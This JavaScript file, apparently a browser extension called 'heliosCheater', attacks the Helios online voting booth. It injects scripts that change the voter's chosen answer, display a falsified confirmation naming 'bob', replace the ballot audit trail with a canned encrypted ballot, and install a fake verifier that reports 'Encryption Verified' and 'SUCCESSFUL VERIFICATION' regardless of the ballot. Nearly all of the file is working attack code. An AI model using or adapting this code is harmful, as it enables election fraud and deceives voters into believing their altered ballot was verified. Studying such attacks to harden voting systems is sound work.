
// audit json
var auditJson = "{\\\"answers\\\": [{\\\"choices\\\": [{\\\"alpha\\\": \\\"874619121102102414247667263926002000496059251262566478595523536974167459037385906015808493432457674426850217639828713339492609772366581148716259974494660268164630522249897801276966322826333532926743249902555406707322856347008811986919604937788278744085126675355475757177058830959819443576748687437138782303172844388344758254016666780875868705226478221430974358086784620379062284970411229846365985691760071031168275703042496735870468392074865017327963305214296527175757248722913080529744517357280585241486988155302443643147317852910512698651391420021619694334650808600182103904311324178480397791092430495200423978892\\\", \\\"beta\\\": \\\"12779916925465249802888884438549951044949935213257460492263172233761514877903370622012433567502295688309470441567856258549288220920777147697212459485463152576219579289275339412133658901351845578764797666406174945851195086081630869696125657136070892641013446643784919742616412001679214449583069842203411838615460919850472655648455006313159796250371899670725669534694939838030305926267182363911494246932442343879742606298511981829226336709394756793476217281081071328275270208343900681455830703758164081923583963426311054045064599818463991675070364484936830890994042653832560285306323777837668165291462399969008422504595\\\"}, {\\\"alpha\\\": \\\"3284519133022083461901709076735152547872971793070532731009083712179882773858540080142406825117435678325913348864614383393021311313359768874538545925868149211151287789667805842990664811285547735958797470230867691769364713160065127780405519751117269764510255916080201933586311897152850820570285421987674577716066410257562775989862548899344061119369899249961518701050422491103871051449825581541187316455014556873749770737561168908186302759414316294984935578821405139601591149930767260002996610126700872641033669617359664757222864218246771522751354878754284669530503549489392937588764213239766895010083123814846390554978\\\", \\\"beta\\\": \\\"14275809648418985888256652675497105726317902623911061829482731504785100698123854975664930188243096306144522462545568137715460698521975677889492142246366966529773704256253929509687922970705265850888462802669311853936357368806910404849558953039593259378153316259471958512395971653593956125483639002527867478048963314374613025771725757832583177300100142704126707605516813064682801235816462630979419799311715049306791137176238136159344272047642423153247355721487650932204364737436529923934348791925201864758109154833927286760674545427456752982842467865198880176978454881057161168903049597429621495611515131771017085785927\\\"}], \\\"individual_proofs\\\": [[{\\\"challenge\\\": \\\"54940327214169128049707548115558592974787592532850787920793176779882879656685\\\", \\\"commitment\\\": {\\\"A\\\": \\\"4993237883180162108914463958158246568032718368219397115075986212172498979756990970905734619042347663179777972187602395644284219750738059935587951450513429036939340423761954363633646208923271340751461522433586705019213572064342432453798953296626485351193712795029839917521667922599438689506155813939171973266871074104261674408554925429782543838691613622740229729121102749719399427903413446704686425057885284679746656247041353994871194543283542514850258311251880091975067926664947511063778719205360352692185603542809649718476020626261349113460953424147789544446275114437818626017555823820291875470618825577269104194465\\\", \\\"B\\\": \\\"10721894928020749720306294203977084170174379215469290337372214355957480141369745086818251506175000207968354064071824339111222243904175782357861797044229522855053980184155624627891978760778635055196626300842950868652654982956974185553009807976353394806536143608868572118870131981612803252506053873460656813774510699376347044475377909600517510397225187077035464243041279663985553179272646670932163585426026659956133505547844623470145761836376482640786243023364154339987041837044221159364616433459859147310589563220942417569896535058567262045404450457239821538883096602969330913940171648883866357763505127222666324228168\\\"}, \\\"response\\\": \\\"30080074931953373005487231141109749272067852770032431619110755057644799769446\\\"}, {\\\"challenge\\\": \\\"6389239034173773242836324654762478231835585299675767036427896083515786840645\\\", \\\"commitment\\\": {\\\"A\\\": \\\"11079957958557590164761065238875950445978157695494045163728667992731399458626113967731657066543863877482654209737624838344141807720666466435282609493985694531695648565368170084812542974723031252431107850345592452528798416682329060864014161144275230793142986268693139880069975959980353807166234483314940760231657755264200528878929412731564416804705422670490808736270784201562343648863537066448702467408646133791999997418918548763776046766671055087263012837070850320808331848077230570307219586727008028947998529255238188288068180195507499975463085921797363985174842112010789903408352280689699248632477903633437554217858\\\", \\\"B\\\": \\\"9276979231198147660182454863290403039581419391731450921650848668255243634978520669744754039943710175016515629948696949413684059504710987107093733559871373646730430907761631985323789096461409159187917476537965857731449837196503797418878505540361040236522265728656872550842688510069850369506030616154968505306187283988702272276400227177031433932660619744373279690295645493447873258580122127054151443363840022084148738541579183373310445957023460329070101603537309914189446116493225939824261173664489292108299241216821015329591532131921844889355627037093945430869646366324146307439298186947182574049319825440725282370036\\\"}, \\\"response\\\": \\\"26317396963319806799878586851654884965792193132478118781935177850005865985084\\\"}], [{\\\"challenge\\\": \\\"24092321469239984124349248555923473479341483953875957102458505692559379318320\\\", \\\"commitment\\\": {\\\"A\\\": \\\"15174409040338624680863187046260894509423665674912710377169070624669300165500120158493349764419852515621543771288869714036260771110217296922639285928090287666760771210472108940372031282831027123575572302317805678273557127262665098059972585465071233023878498373778250618849824617309440822971272875323607031136250421968137337923511411467762859110161972813106649018932824888985983378053187151451611398940459139520770866178993033385883970716936135491589406729227857874430213522474898367785687465703599095522599373833269953326677019282210870409036794224317119264011765175711955371949144994467961032819447726137043752182521\\\", \\\"B\\\": \\\"15020889175767457442751056267826276244124469964300519173972227688097111423781780107698477017193830922705556325496139489241640500421401603861810661341324104028388614128448243792977491895292035836482726911444334564203359519403736408892891737978812479288436664614854613643255389906835838659963138205653169780718557001148567561019377270030187243115167353782575223502433441768556843474817229464872642955268636941735964383158916311091612832734552868066116009738088781172144008510828685783655243315230393888118780653344562259921180311735109997805658432180193228154471003815087197759143918821711228356515096958765983144929428\\\"}, \\\"response\\\": \\\"40056362316444001476229891844367003808493057821681195364701798867405981576628\\\"}, {\\\"challenge\\\": \\\"37237244779102917168194624214871618357825902772552808618407478237284351779472\\\", \\\"commitment\\\": {\\\"A\\\": \\\"7289092324990150766359109540413474917157227524602397081021251336636581364139494608105214438401931974538554645700488062573915032258043652996558787306859985245498382322145187882582506744552947635137823567839963978729580999996505785742190945285494645365482188198072885156474953200686408752422343909486499768048014436905922160323195563992822948354792807060010178014689164765247854994432093945835299216815894001672111561339131257907782508328187635731957879616700626535820384647694981131376687403090893182094417393542131324304571563949523129553432788704717489630367019179796965593499436699608505901079085447988084640017668\\\", \\\"B\\\": \\\"1904221166894193839523233989316093854938033996229136152704643916037667736619169760650395397851213070588447127016793407657150452428687029330039733325180255852103986241343827303834044473704059842365559115720396922872764617077920484927902692947612731073080244994777393483711829487014672221793169192770620783141462111131873482041620902881315603510533205202828142784711141465483437336216695187857832127099376040560590124007713085065589264849868925607099607728795577033818307094440514423319176941740068222152761679709739862023542423018532922013624131847049576796759490021966312297102789246154330978821732701949839599330937\\\"}, \\\"response\\\": \\\"33344443469247103122473871717727919007989662724723293546109946177534328398512\\\"}]], \\\"overall_proof\\\": [{\\\"challenge\\\": \\\"1343833097734627962468669140560980267079198401090\\\", \\\"commitment\\\": {\\\"A\\\": \\\"3573964017525553496273595529862617121687721201696948341812537019007226318690271236475090034650664222702025197638514492943486002821012640758746522180149297720859442241423097283420485639749439190695376987662353250973907173098543523930737683045250432112423659142024896166888238630648506412644521064607773520494364094226990506853512998820920160521599523433216779162906776444115978881385678341266800669332001336311545486247291276709866787508777825553647401390154755398700849203394546845560367720455779040484082021608861163058033197587419448564364268343765865593807698742706374176856773021630517404033575239707668791086186\\\", \\\"B\\\": \\\"8552182816671631121399371957141329665954481062943803468420848416617422304864708664115229024014089635358706590468951609784052690481846966106033676378782049734458014445049680589557040266317592830104924167247490607827423417787208020174923478501647478376719568018002418134752189712179518568127132129853799682639022181566095028242224234625312518665820462272499254561132075294998004285146557791708939191602522621093075948649976630243484312106348227084827311438457847312226708037811788871877442649599008565242968134110836416246883440718194888664921694037697234185779123000754240844244105289173000153749755647254646393362892\\\"}, \\\"response\\\": \\\"32652341865917549948279080168886050130749179503667518550099992994980851723560\\\"}], \\\"answer\\\": [1], \\\"randomness\\\": [\\\"49445231964303338443772387788658386399873280641605170980980546497542393549264\\\", \\\"49739176818566033211965739986735185679488247204185608574072481206459934852745\\\"]}], \\\"election_hash\\\": \\\"s4YTmj+uObF0uoTEOz9fi1qqTudcZd6Cwa1ZO2zioZ8\\\", \\\"election_uuid\\\": \\\"aa5ab8e4-63ad-11e1-baa3-12313f028a58\\\"}";
// this script is for verify encryption
var scriptAudit = "BOOTH.audit_yoyoyo = function() {\
BOOTH.audit_trail = BigInt.patchForChrome(function() {\
return \"" + auditJson
    + "\"});\
BOOTH.show($(\'#audit_div\')).processTemplate({\'audit_trail\' : BOOTH.audit_trail, \'election_url\' : BOOTH.election_url});\
};";

// link update
var scriptUpdate = "BOOTH.my_show_question = function(question_num) {\
BOOTH.started_p = true;\
if (question_num == BOOTH.election.questions.length -1)\
BOOTH.all_questions_seen = true;\
BOOTH.show_progress(\'1\');\
BOOTH.show($(\'#question_div\')).processTemplate({\'question_num\' : question_num, \
\'last_question_num\' : BOOTH.election.questions.length - 1,\
\'question\' : BOOTH.election.questions[question_num], \'show_reviewall\' : BOOTH.all_questions_seen\
});\
var answer_array = BOOTH.ballot.answers[question_num];\
BOOTH.ballot.answers[question_num] = [];\
$(answer_array).each(function(i, ans) {\
document.forms[\'answer_form\'][\'answer_\'+question_num+\'_\'+1].click();\
BOOTH.ballot.answers[question_num].pop();\
BOOTH.lala(0, 0, true);\
});\
};";


// my_show_confirm
var scriptShowConfirm = "BOOTH.my_show_confirm = function() {\
var choices = BALLOT.pretty_choices(BOOTH.election, BOOTH.ballot);\
choices[0][0] = \"bob\";\
BOOTH.show($('#confirm_div')).processTemplate({'questions' : BOOTH.election.questions, 'choices' : choices});\
};";
// this script is when clicking proceed and go
var scriptProceed = "BOOTH.my_validate_and_confirm = function(question_num) {\
if (BOOTH.validate_question(question_num)) {\
var choices = BALLOT.pretty_choices(BOOTH.election, BOOTH.ballot);\
choices[0][0] = \"bob\";\
BOOTH.show($(\'#confirm_div\')).processTemplate({\'questions\' : BOOTH.election.questions, \'choices\' : choices});\
}\
};";
// this script is when user clicks the checkbox and change the color of the label...wtf..
var scriptClick = "BOOTH.lala = function(question_num, answer_num, checked_p) {\
if (checked_p) {\
if ($(BOOTH.ballot.answers[question_num]).index(answer_num) == -1)\
BOOTH.ballot.answers[question_num].push(answer_num);\
$(\'#answer_label_\' + question_num + \"_\" + 1).addClass(\'selected\');\
} else {\
BOOTH.ballot.answers[question_num] = UTILS.array_remove_value(BOOTH.ballot.answers[question_num], answer_num);\
$(\'#answer_label_\' + question_num + \"_\" + 1).removeClass(\'selected\');\
}\
if (BOOTH.election.questions[question_num].max != null && BOOTH.ballot.answers[question_num].length >= BOOTH.election.questions[question_num].max) {\
$(\'.ballot_answer\').each(function(i, checkbox) {\
if (!checkbox.checked)\
checkbox.disabled = true;\
});\
$(\'#warning_box\').html(\"Maximum number of options selected.<br />To change your selection, please de-select a current selection first.\");\
} else {\
$(\'.ballot_answer\').each(function(i, checkbox) {\
checkbox.disabled = false;\
});\
$(\'#warning_box\').html(\"\");\
}\
};" + scriptProceed + scriptShowConfirm + scriptUpdate + scriptAudit;

// verify
var ballotHash = "";
var electionHash = "s4YTmj+uObF0uoTEOz9fi1qqTudcZd6Cwa1ZO2zioZ8";
var scriptVerify = "";

function addScript(script, parent, sid) {
    var ele = content.document.createElement("script");
    ele.setAttribute("language", "javascript");
    ele.setAttribute("id", sid);
    ele.innerHTML = script;
    parent.appendChild(ele);
}

var heliosCheater = function () {
    var chooseRight = false;
    return {
	init : function () {
	    gBrowser.addEventListener("DOMContentLoaded", function () {		
		heliosCheater.run();		
	    }, false);
	},

	run : function () {
	    var url = content.document.location.href;
	    // voting page
	    if (url.toString().match("vote.heliosvoting.org/booth") != null) {

		//////////////////////////////////////////////////
		// select
		var cb = content.document.getElementById("answer_0_1");
		if (cb != null) {
		    chooseRight = !cb.checked;
		    cb.setAttribute("onclick", "BOOTH.lala(0, 0, this.checked);");
		    // add new script element
		    var s = content.document.getElementById("check_script");
		    if (s == null) {
			var aa = content.document.getElementsByTagName("script")[12];
			addScript(scriptClick, aa.parentNode, "check_script");
		    }
		}
		//////////////////////////////////////////////////
		// review
		var warningBox = content.document.getElementById("warning_box");
		var btProceed = null;
		if (warningBox != null)
		    btProceed = warningBox.nextSibling.getElementsByTagName("input")[0];
	    	if (btProceed != null) {
		    if (!chooseRight) {
			btProceed.setAttribute("onclick", "BOOTH.my_validate_and_confirm(0);");
		    } else
			btProceed.setAttribute("onclick", "BOOTH.validate_and_confirm(0);");
		}
		var confirmDiv = content.document.getElementById("confirm_div");
		var lkUpdate = null;
		if (confirmDiv != null)
		    lkUpdate = confirmDiv.getElementsByTagName("a")[0];
		if (lkUpdate != null) {
		    if (!chooseRight)
			lkUpdate.setAttribute("onclick", "BOOTH.my_show_question(0);return false;");
		    else
			lkUpdate.setAttribute("onclick", "BOOTH.show_question(0);return false;");
		}
		//////////////////////////////////////////////////
		// audit
		var auditDiv = content.document.getElementById("auditbody");
		var btAudit = null;
		if (auditDiv != null)
		    btAudit = auditDiv.getElementsByTagName("input")[0];
		if (btAudit != null) {
		    if (!chooseRight)
			btAudit.setAttribute("onclick", "BOOTH.audit_yoyoyo();");
		    else
			btAudit.setAttribute("onclick", "BOOTH.audit_ballot();");
		}
		var btPost = content.document.getElementById("post_audited_ballot_button");
		var btBackToVoting = null
		if (btPost != null)
		    btBackToVoting = btPost.parentNode.getElementsByTagName("input")[1];
		if (btBackToVoting != null) {
		    if (!chooseRight)
			btBackToVoting.setAttribute("onclick", "BOOTH.my_show_confirm();");
		    else
			btBackToVoting.setAttribute("onclick", "BOOTH.show_confirm();");
		}
		//////////////////////////////////////////////////
		// verify
		if (content.document.location.href.toString().match("single-ballot-verify") != null) {
		    // add new script element
		    var vs = content.document.getElementsByTagName("body")[0];
		    if (content.document.getElementById("verify_script") == null)
			addScript(scriptVerify, vs, "verify_script");
		    // change onsubmit
		    var verifyDiv = content.document.getElementById("verifier");
		    if (verifyDiv != null) {
			var fm = verifyDiv.getElementsByTagName("form")[0];
			if (fm != null) {
			    if (!chooseRight)
				fm.setAttribute("onsubmit",
						"my_verify_single_ballot(this.election_url.value,\
                                                 this.audit_trail.value);return false;");
			    else
				fm.setAttribute("onsubmit",
						"verify_single_ballot(this.election_url.value,\
                                                 this.audit_trail.value);return false;");             
			}
		    }
		}
		// get ballot hash
		var sealDiv = content.document.getElementById("seal_div");
		if (!chooseRight && sealDiv != null && sealDiv.getAttribute("style") != null
		    && sealDiv.getAttribute("style").match("block") != null) {
		    ballotHash = sealDiv.getElementsByTagName("tt")[0].innerHTML.toString().substring(18);
		    scriptVerify = "function my_verify_single_ballot(election_url, audit_trail) {\
var encrypted_vote_json = jQuery.secureEvalJSON(audit_trail);\
result_append(\"loading election...\");\
$(\'#loading\').show();\
$.ajax({url: election_url, success: function(raw_json) {\
var overall_result = true;\
try {\
election = HELIOS.Election.fromJSONString(raw_json);\
var election_hash = election.get_hash();\
result_append(\"election fingerprint is " + electionHash + "\");\
encrypted_vote = HELIOS.EncryptedVote.fromJSONObject(encrypted_vote_json, election);\
BigInt.patchForChrome(function() {\
return $.toJSON(encrypted_vote.toJSONObject());\
});\
result_append(\"smart ballot tracker is " + ballotHash + "\");\
result_append(\"election fingerprint matches ballot\");\
result_append(\"Ballot Contents:\");\
$(election.questions).each(function(qnum, q) {\
var answer_pretty_list = jQuery.map(encrypted_vote.encrypted_answers[qnum].answer, function(aindex, anum) {\
return q.answers[aindex];\
});\
result_append(\"Question #1 - president : bob\");\
});\
result_append(\"Encryption Verified\");\
result_append(\"Proofs ok.\");\
} catch (e) {\
}\
result_append(\"<br />\");\
$(\'#loading\').hide();\
result_append(\'SUCCESSFUL VERIFICATION, DONE!\');\
}, error: function() {\
$(\'#loading\').hide();\
}\
});\
};";
		}

		var t = setTimeout("heliosCheater.run()", 1000);
	    }
	}
    }; 
}();
window.addEventListener("load", heliosCheater.init, false);